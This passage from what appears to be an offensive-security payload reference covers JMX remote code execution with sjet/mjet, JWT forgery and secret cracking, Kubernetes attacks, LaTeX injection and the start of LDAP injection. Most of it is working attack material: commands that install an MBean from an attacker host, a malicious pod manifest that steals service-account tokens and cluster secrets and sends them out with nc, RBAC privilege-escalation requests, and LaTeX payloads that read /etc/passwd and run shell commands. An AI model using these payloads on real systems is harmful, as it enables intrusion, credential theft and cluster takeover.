invokes methods from the malicious MBean. Exploit the JMX using sjet or mjet\njython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000 jython sjet.py TARGET_IP TARGET_PORT super_secret command \u0026#34;ls -la\u0026#34; jython sjet.py TARGET_IP TARGET_PORT super_secret shell jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 \u0026#34;touch /tmp/xxx\u0026#34; jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000 jython mjet.py TARGET_IP TARGET_PORT command super_secret \u0026#34;whoami\u0026#34; jython mjet.py TARGET_IP TARGET_PORT command super_secret shell References # ATTACKING RMI BASED JMX SERVICES - HANS-MARTIN MÜNCH - 28 APR 2019 JMX RMI – MULTIPLE APPLICATIONS RCE - Red Timmy Security - 26th March 2019 "},{"id":54,"href":"/docs/json_web_token/","title":"JSON Web Tokens","section":"Docs","content":" JWT - JSON Web Token # JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.\nTools # jwt_tool c-jwt-cracker JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper JWT Format # JSON Web Token : Base64(Header).Base64(Data).Base64(Signature)\nExample : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY\nWhere we can split it into 3 components separated by a dot.\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 # header eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ # payload UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature Header # Default algorithm is \u0026ldquo;HS256\u0026rdquo; (HMAC SHA256 symmetric encryption). \u0026ldquo;RS256\u0026rdquo; is used for asymmetric purposes (RSA asymmetric encryption and private key signature).\n{ \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34; } | alg Param Value | Digital Signature or MAC Algorithm | Requirements | |+++|\u0026mdash;|\u0026mdash;| | HS256 | HMAC using SHA-256 | Required | | HS384 | HMAC using SHA-384 | Optional | | HS512 | HMAC using SHA-512 | Optional | | RS256\t| RSASSA-PKCS1-v1_5 using SHA-256 | Recommended | | RS384 | RSASSA-PKCS1-v1_5 using SHA-384 |\tOptional | | RS512 | RSASSA-PKCS1-v1_5 using SHA-512 |\tOptional | | ES256 | ECDSA using P-256 and SHA-256\t| Recommended | | ES384 | ECDSA using P-384 and SHA-384 | Optional | | ES512 | ECDSA using P-521 and SHA-512\t| Optional | | PS256 | RSASSA-PSS using SHA-256 and MGF1 with SHA-256 |\tOptional | | PS384 | RSASSA-PSS using SHA-384 and MGF1 with SHA-384 |\tOptional | | PS512 | RSASSA-PSS using SHA-512 and MGF1 with SHA-512 |\tOptional | | none\t| No digital signature or MAC performed |\tRequired |\nPayload # { \u0026#34;sub\u0026#34;:\u0026#34;1234567890\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Amazing Haxx0r\u0026#34;, \u0026#34;exp\u0026#34;:\u0026#34;1466270722\u0026#34;, \u0026#34;admin\u0026#34;:true } Claims are the predefined keys and their values:\niss: issuer of the token exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds. iat: The time the JWT was issued. Can be used to determine the age of the JWT nbf: \u0026ldquo;not before\u0026rdquo; is a future time when the token will become active. jti: unique identifier for the JWT. Used to prevent the JWT from being re-used or replayed. sub: subject of the token (rarely used) aud: audience of the token (also rarely used) JWT Encoder – Decoder: http://jsonwebtoken.io\nJWT Signature - None algorithm # JWT supports a None algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.\nNone algorithm variants:\nnone None NONE nOnE To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT.\nHowever, this won\u0026rsquo;t work unless you remove the signature\nAlternatively you can modify an existing JWT (be careful with the expiration time)\n#!/usr/bin/python3 # -*- coding: utf-8 -*- import jwt jwtToken = \u0026#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ\u0026#39; decodedToken = jwt.decode(jwtToken, verify=False) # Need to decode the token before encoding with type \u0026#39;None\u0026#39; noneEncoded = jwt.encode(decodedToken, key=\u0026#39;\u0026#39;, algorithm=None) print(noneEncoded.decode()) \u0026#34;\u0026#34;\u0026#34; Output: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0. \u0026#34;\u0026#34;\u0026#34; JWT Signature - RS256 to HS256 # Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data.\nThe algorithm HS256 uses the secret key to sign and verify each message. The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.\nimport jwt public = open(\u0026#39;public.pem\u0026#39;, \u0026#39;r\u0026#39;).read() print public print jwt.encode({\u0026#34;data\u0026#34;:\u0026#34;test\u0026#34;}, key=public, algorithm=\u0026#39;HS256\u0026#39;) :warning: This behavior is fixed in the python library and will return this error jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.. You need to install the following version: pip install pyjwt==0.4.3.\nHere are the steps to edit an RS256 JWT token into an HS256\nConvert our public key (key.pem) into HEX with this command.\n$ cat key.pem | xxd -p | tr -d \u0026#34;\\\\n\u0026#34; 2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.\n$ echo -n \u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ\u0026#34; | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0 Convert signature (Hex to \u0026ldquo;base64 URL\u0026rdquo;)\n$ python2 -c \u0026#34;exec(\\\u0026#34;import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex(\u0026#39;8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0\u0026#39;)).replace(\u0026#39;=\u0026#39;,\u0026#39;\u0026#39;)\\\u0026#34;)\u0026#34; Add signature to edited payload\n[HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA Breaking JWT\u0026rsquo;s secret # Encode/Decode JWT with the secret.\nimport jwt encoded = jwt.encode({\u0026#39;some\u0026#39;: \u0026#39;payload\u0026#39;}, \u0026#39;secret\u0026#39;, algorithm=\u0026#39;HS256\u0026#39;) # encode with \u0026#39;secret\u0026#39; encoded = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE\u0026#34; jwt.decode(encoded, \u0026#39;Sn1f\u0026#39;, algorithms=[\u0026#39;HS256\u0026#39;]) # decode with \u0026#39;Sn1f\u0026#39; as the secret key # result {u\u0026#39;admin\u0026#39;: True, u\u0026#39;sub\u0026#39;: u\u0026#39;1234567890\u0026#39;, u\u0026#39;name\u0026#39;: u\u0026#39;John Doe\u0026#39;} JWT tool # First, bruteforce the \u0026ldquo;secret\u0026rdquo; key used to compute the signature.\ngit clone https://github.com/ticarpi/jwt_tool python3 -m pip install termcolor cprint pycryptodomex requests python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C \\ \\ \\ \\ \\ \\ \\__ | | \\ |\\__ __| \\__ __| | | | \\ | | | \\ \\ | | \\ | | | __ \\ __ \\ | \\ | _ | | | | | | | | | | / \\ | | | | | | | | \\ | / \\ | | |\\ |\\ | | \\______/ \\__/ \\__| \\__| \\__| \\______/ \\______/ \\__| Version 2.2.2 \\______| @ticarpi Original JWT: [+] secret is the CORRECT key! You can tamper/fuzz the token contents (-T/-I) and sign it using: python3 jwt_tool.py [options here] -S HS256 -p \u0026#34;secret\u0026#34; Then edit the field inside the JSON Web Token.\nCurrent value of role is: user Please enter new value and hit ENTER \u0026gt; admin [1] sub = 1234567890 [2] role = admin [3] iat = 1516239022 [0] Continue to next step Please select a field number: (or 0 to Continue) \u0026gt; 0 Finally, finish the token by signing it with the previously retrieved \u0026ldquo;secret\u0026rdquo; key.\nToken Signing: [1] Sign token with known key [2] Strip signature from token vulnerable to CVE-2015-2951 [3] Sign with Public Key bypass vulnerability [4] Sign token with key file Please select an option from above (1-4): \u0026gt; 1 Please enter the known key: \u0026gt; secret Please enter the key length: [1] HMAC-SHA256 [2] HMAC-SHA384 [3] HMAC-SHA512 \u0026gt; 1 Your new forged token: [+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic [+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic Recon: python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw Scanning: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \u0026quot;jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\u0026quot; -M pb Exploitation: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \u0026quot;jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\u0026quot; -X i -I -pc name -pv admin Fuzzing: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \u0026quot;jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\u0026quot; -I -hc kid -hv custom_sqli_vectors.txt Review: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \u0026quot;jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\u0026quot; -X i -I -pc name -pv admin JWT cracker # git clone https://github.com/brendan-rius/c-jwt-cracker ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE Secret is \u0026#34;Sn1f\u0026#34; Hashcat # Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - src\n/hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret CVE # CVE-2015-2951 - The alg=none signature-bypass vulnerability CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability CVE-2018-0114 - Key injection vulnerability CVE-2019-20933/CVE-2020-28637 - Blank password vulnerability CVE-2020-28042 - Null signature vulnerability References # Hacking JSON Web Token (JWT) - Hate_401 WebSec CTF - Authorization Token - JWT Challenge Privilege Escalation like a Boss - October 27, 2018 - janijay007 5 Easy Steps to Understanding JSON Web Token Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq Simple JWT hacking - @b1ack_h00d Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar HACKING JSON WEB TOKENS, FROM ZERO TO HERO WITHOUT EFFORT - Thu Feb 09 2017 - @pdp Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017 JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020 "},{"id":55,"href":"/docs/kuburnetes/","title":"Kuburnetes","section":"Docs","content":" Kubernetes # Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.\nTools # kubeaudit - Audit Kubernetes clusters against common security concerns kubesec.io - Security risk analysis for Kubernetes resources kube-bench - Checks whether Kubernetes is deployed securely by running CIS Kubernetes Benchmark kube-hunter - Hunt for security weaknesses in Kubernetes clusters katacoda - Learn Kubernetes using interactive broser-based scenarios kubescape - Automate Kubernetes cluster scans to identify security issues Container Environment # Containers within a Kubernetes cluster automatically have certain information made available to them through their container environment. Additional information may have been made available through the volumes, environment variables, or the downward API, but this section covers only what is made available by default.\nService Account # Each Kubernetes pod is assigned a service account for accessing the Kubernetes API. The service account, in addition to the current namespace and Kubernetes SSL certificate, are made available via a mounted read-only volume:\n/var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/ca.crt If the kubectl utility is installed in the container, it will use this service account automatically and will make interacting with the cluster much easier. If not, the contents of the token and namespace files can be used to make HTTP API requests directly.\nEnvironment Variables # The KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node. If kubectl is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to.\nKUBERNETES_SERVICE_HOST=192.168.154.228 KUBERNETES_SERVICE_PORT=443 Additionally, environment variables are automatically created for each Kubernetes service running in the current namespace when the container was created. The environment variables are named using two patterns:\nA simplified {SVCNAME}_SERVICE_HOST and {SVCNAME}_SERVICE_PORT contain the IP address and default port number for the service. A Docker links collection of variables named {SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR} for each port the service exposes. For example, all of the following environment variables would be available if a redis-master service were running with port 6379 exposed:\nREDIS_MASTER_SERVICE_HOST=10.0.0.11 REDIS_MASTER_SERVICE_PORT=6379 REDIS_MASTER_PORT=tcp://10.0.0.11:6379 REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379 REDIS_MASTER_PORT_6379_TCP_PROTO=tcp REDIS_MASTER_PORT_6379_TCP_PORT=6379 REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11 Simulating kubectl API Requests # Most containers within a Kubernetes cluster won\u0026rsquo;t have the kubectl utility installed. If running the one-line kubectl installer within the container isn\u0026rsquo;t an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using kubectl locally to determine the correct API request to send from the container.\nRun the desired command at the maximum verbosity level using kubectl -v9 ... The output will include HTTP API endpoint URL, the request body, and an example curl command. Replace the endpoint URL\u0026rsquo;s hostname and port with the KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT values from the container\u0026rsquo;s environment variables. Replace the masked \u0026ldquo;Authorization: Bearer\u0026rdquo; token value with the contents of /var/run/secrets/kubernetes.io/serviceaccount/token from the container. If the request had a body, ensure the \u0026ldquo;Content-Type: application/json\u0026rdquo; header is included and send the request body using the customary method (for curl, use the --data flag). For example, this output was used to create the Service Account Permissions request:\n# NOTE: only the Authorization and Content-Type headers are required. The rest can be omitted. $ kubectl -v9 auth can-i --list I1028 18:58:38.192352 76118 loader.go:359] Config loaded from file /home/example/.kube/config I1028 18:58:38.193847 76118 request.go:942] Request Body: {\u0026#34;kind\u0026#34;:\u0026#34;SelfSubjectRulesReview\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;authorization.k8s.io/v1\u0026#34;,\u0026#34;metadata\u0026#34;:{\u0026#34;creationTimestamp\u0026#34;:null},\u0026#34;spec\u0026#34;:{\u0026#34;namespace\u0026#34;:\u0026#34;default\u0026#34;},\u0026#34;status\u0026#34;:{\u0026#34;resourceRules\u0026#34;:null,\u0026#34;nonResourceRules\u0026#34;:null,\u0026#34;incomplete\u0026#34;:false}} I1028 18:58:38.193912 76118 round_trippers.go:419] curl -k -v -XPOST -H \u0026#34;Accept: application/json, */*\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -H \u0026#34;User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1\u0026#34; \u0026#39;https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\u0026#39; I1028 18:58:38.295722 76118 round_trippers.go:438] POST https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 201 Created in 101 milliseconds I1028 18:58:38.295760 76118 round_trippers.go:444] Response Headers: ... Information Gathering # Service Account Permissions # The default service account may have been granted additional permissions that make cluster compromise or lateral movement easier.\nThe following can be used to determine the service account\u0026rsquo;s permissions:\n# Namespace-level permissions using kubectl kubectl auth can-i --list # Cluster-level permissions using kubectl kubectl auth can-i --list --namespace=kube-system # Permissions list using curl NAMESPACE=$(cat \u0026#34;/var/run/secrets/kubernetes.io/serviceaccount/namespace\u0026#34;) # For cluster-level, use NAMESPACE=\u0026#34;kube-system\u0026#34; instead MASTER_URL=\u0026#34;https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\u0026#34; TOKEN=$(cat \u0026#34;/var/run/secrets/kubernetes.io/serviceaccount/token\u0026#34;) curl \u0026#34;${MASTER_URL}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\u0026#34; \\ --cacert \u0026#34;/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\u0026#34; \\ --header \u0026#34;Authorization: Bearer ${TOKEN}\u0026#34; \\ --header \u0026#34;Content-Type: application/json\u0026#34; \\ --data \u0026#39;{\u0026#34;kind\u0026#34;:\u0026#34;SelfSubjectRulesReview\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;authorization.k8s.io/v1\u0026#34;,\u0026#34;spec\u0026#34;:{\u0026#34;namespace\u0026#34;:\u0026#34;\u0026#39;${NAMESPACE}\u0026#39;\u0026#34;}}\u0026#39; Secrets, ConfigMaps, and Volumes # Kubernetes provides Secrets and ConfigMaps as a way to load configuration into containers at runtime. While they may not lead directly to whole cluster compromise, the information they contain can lead to individual service compromise or enable lateral movement within a cluster.\nFrom a container perspective, Kubernetes Secrets and ConfigMaps are identical. Both can be loaded into environment variables or mounted as volumes. It\u0026rsquo;s not possible to determine if an environment variable was loaded from a Secret/ConfigMap, so each environment variable will need to be manually inspected. When mounted as a volume, Secrets/ConfigMaps are always mounted as read-only tmpfs filesystems. You can quickly find these with grep -F \u0026quot;tmpfs ro\u0026quot; /etc/mtab.\nTrue Kubernetes Volumes are typically used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and can be identified with grep -wF \u0026quot;ext4\u0026quot; /etc/mtab.\nPrivileged Containers # Kubernetes supports a wide range of security contexts for container and pod execution. The most important of these is the \u0026ldquo;privileged\u0026rdquo; security policy which makes the host node\u0026rsquo;s devices available under the container\u0026rsquo;s /dev directory. This means having access to the host\u0026rsquo;s Docker socket file (allowing arbitrary container actions) in addition to the host\u0026rsquo;s root disks (which can be used to escape the container entirely).\nWhile there is no official way to check for privileged mode from within a container, checking if /dev/kmsg exists will usually suffice.\nRBAC Configuration # Listing Secrets # An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in \u0026ldquo;kube-system\u0026rdquo; namespace.\ncurl -v -H \u0026#34;Authorization: Bearer \u0026lt;jwt_token\u0026gt;\u0026#34; https://\u0026lt;master_ip\u0026gt;:\u0026lt;port\u0026gt;/api/v1/namespaces/kube-system/secrets/ Access Any Resource or Verb # resources: - \u0026#39;*\u0026#39; verbs: - \u0026#39;*\u0026#39; Pod Creation # Check your right with kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml. Then create a malicious pod.yaml file.\napiVersion: v1 kind: Pod metadata: name: alpine namespace: kube-system spec: containers: - name: alpine image: alpine command: [\u0026#34;/bin/sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#39;apk update \u0026amp;\u0026amp; apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \u0026#34;Authorization: Bearer $TOKEN\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000\u0026#39;] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true Then kubectl apply -f malicious-pod.yaml\nPrivilege to Use Pods/Exec # kubectl exec -it \u0026lt;POD NAME\u0026gt; -n \u0026lt;PODS NAMESPACE\u0026gt; –- sh Privilege to Get/Patch Rolebindings # The purpose of this JSON file is to bind the admin \u0026ldquo;CluserRole\u0026rdquo; to the compromised service account. Create a malicious RoleBinging.json file.\n{ \u0026#34;apiVersion\u0026#34;: \u0026#34;rbac.authorization.k8s.io/v1\u0026#34;, \u0026#34;kind\u0026#34;: \u0026#34;RoleBinding\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;malicious-rolebinding\u0026#34;, \u0026#34;namespcaes\u0026#34;: \u0026#34;default\u0026#34; }, \u0026#34;roleRef\u0026#34;: { \u0026#34;apiGroup\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;kind\u0026#34;: \u0026#34;ClusterRole\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;admin\u0026#34; }, \u0026#34;subjects\u0026#34;: [ { \u0026#34;kind\u0026#34;: \u0026#34;ServiceAccount\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;sa-comp\u0026#34; \u0026#34;namespace\u0026#34;: \u0026#34;default\u0026#34; } ] } curl -k -v -X POST -H \u0026#34;Authorization: Bearer \u0026lt;JWT TOKEN\u0026gt;\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; https://\u0026lt;master_ip\u0026gt;:\u0026lt;port\u0026gt;/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json curl -k -v -X POST -H \u0026#34;Authorization: Bearer \u0026lt;COMPROMISED JWT TOKEN\u0026gt;\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; https://\u0026lt;master_ip\u0026gt;:\u0026lt;port\u0026gt;/api/v1/namespaces/kube-system/secret Impersonating a Privileged Account # curl -k -v -XGET -H \u0026#34;Authorization: Bearer \u0026lt;JWT TOKEN (of the impersonator)\u0026gt;\u0026#34; -H \u0026#34;Impersonate-Group: system:masters\u0026#34; -H \u0026#34;Impersonate-User: null\u0026#34; -H \u0026#34;Accept: application/json\u0026#34; https://\u0026lt;master_ip\u0026gt;:\u0026lt;port\u0026gt;/api/v1/namespaces/kube-system/secrets/ Privileged Service Account Token # $ cat /run/secrets/kubernetes.io/serviceaccount/token $ curl -k -v -H \u0026#34;Authorization: Bearer \u0026lt;jwt_token\u0026gt;\u0026#34; https://\u0026lt;master_ip\u0026gt;:\u0026lt;port\u0026gt;/api/v1/namespaces/default/secrets/ Interesting endpoints to reach # # List Pods curl -v -H \u0026#34;Authorization: Bearer \u0026lt;jwt_token\u0026gt;\u0026#34; https://\u0026lt;master_ip\u0026gt;:\u0026lt;port\u0026gt;/api/v1/namespaces/default/pods/ # List secrets curl -v -H \u0026#34;Authorization: Bearer \u0026lt;jwt_token\u0026gt;\u0026#34; https://\u0026lt;master_ip\u0026gt;:\u0026lt;port\u0026gt;/api/v1/namespaces/default/secrets/ # List deployments curl -v -H \u0026#34;Authorization: Bearer \u0026lt;jwt_token\u0026gt;\u0026#34; https://\u0026lt;master_ip:\u0026lt;port\u0026gt;/apis/extensions/v1beta1/namespaces/default/deployments # List daemonsets curl -v -H \u0026#34;Authorization: Bearer \u0026lt;jwt_token\u0026gt;\u0026#34; https://\u0026lt;master_ip:\u0026lt;port\u0026gt;/apis/extensions/v1beta1/namespaces/default/daemonsets API addresses that you should know # (External network visibility)\ncAdvisor # curl -k https://\u0026lt;IP Address\u0026gt;:4194 Insecure API server # curl -k https://\u0026lt;IP Address\u0026gt;:8080 Secure API Server # curl -k https://\u0026lt;IP Address\u0026gt;:(8|6)443/swaggerapi curl -k https://\u0026lt;IP Address\u0026gt;:(8|6)443/healthz curl -k https://\u0026lt;IP Address\u0026gt;:(8|6)443/api/v1 etcd API # curl -k https://\u0026lt;IP address\u0026gt;:2379 curl -k https://\u0026lt;IP address\u0026gt;:2379/version etcdctl --endpoints=http://\u0026lt;MASTER-IP\u0026gt;:2379 get / --prefix --keys-only Kubelet API # curl -k https://\u0026lt;IP address\u0026gt;:10250 curl -k https://\u0026lt;IP address\u0026gt;:10250/metrics curl -k https://\u0026lt;IP address\u0026gt;:10250/pods kubelet (Read only) # curl -k https://\u0026lt;IP Address\u0026gt;:10255 http://\u0026lt;external-IP\u0026gt;:10255/pods References # Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019 Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019 Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019 Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Kubernetes Pod Privilege Escalation "},{"id":56,"href":"/docs/latex_injection/","title":"LaTeX Injection","section":"Docs","content":" LaTex Injection # Read file # Read file and interpret the LaTeX code in it:\n\\input{/etc/passwd} \\include{somefile} # load .tex file (somefile.tex) Read single lined file:\n\\newread\\file \\openin\\file=/etc/issue \\read\\file to\\line \\text{\\line} \\closein\\file Read multiple lined file:\n\\newread\\file \\openin\\file=/etc/passwd \\loop\\unless\\ifeof\\file \\read\\file to\\fileline \\text{\\fileline} \\repeat \\closein\\file Read text file, without interpreting the content, it will only paste raw file content:\n\\usepackage{verbatim} \\verbatiminput{/etc/passwd} If injection point is past document header (\\usepackage cannot be used), some control characters can be deactivated in order to use \\input on file containing $, #, _, \u0026amp;, null bytes, \u0026hellip; (eg. perl scripts).\n\\catcode `\\$=12 \\catcode `\\#=12 \\catcode `\\_=12 \\catcode `\\\u0026amp;=12 \\input{path_to_script.pl} Write file # Write single lined file:\n\\newwrite\\outfile \\openout\\outfile=cmd.tex \\write\\outfile{Hello-world} \\write\\outfile{Line 2} \\write\\outfile{I like trains} \\closeout\\outfile Command execution # The output of the command will be redirected to stdout, therefore you need to use a temp file to get it.\n\\immediate\\write18{id \u0026gt; output} \\input{output} If you get any LaTex error, consider using base64 to get the result without bad characters (or use \\verbatiminput):\n\\immediate\\write18{env | base64 \u0026gt; test.tex} \\input{text.tex} \\input|ls|base64 \\input{|\u0026#34;/bin/hostname\u0026#34;} Cross Site Scripting # From @EdOverflow\n\\url{javascript:alert(1)} \\href{javascript:alert(1)}{placeholder} Live example at http://payontriage.com/xss.php?xss=$\\href{javascript:alert(1)}{Frogs%20find%20bugs}$\nReferences # Hacking with LaTeX - Sebastian Neef - 0day.work Latex to RCE, Private Bug Bounty Program - Yasho Pwning coworkers thanks to LaTeX "},{"id":57,"href":"/docs/ldap_injection/","title":"LDAP Injection","section":"Docs","content":" LDAP injection # LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it\u0026rsquo;s possible to modify LDAP statements using a local proxy.\nExploitation # Example 1.\nuser = *)(uid=*))(|(uid=* pass = password query = (\u0026amp;(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==)) 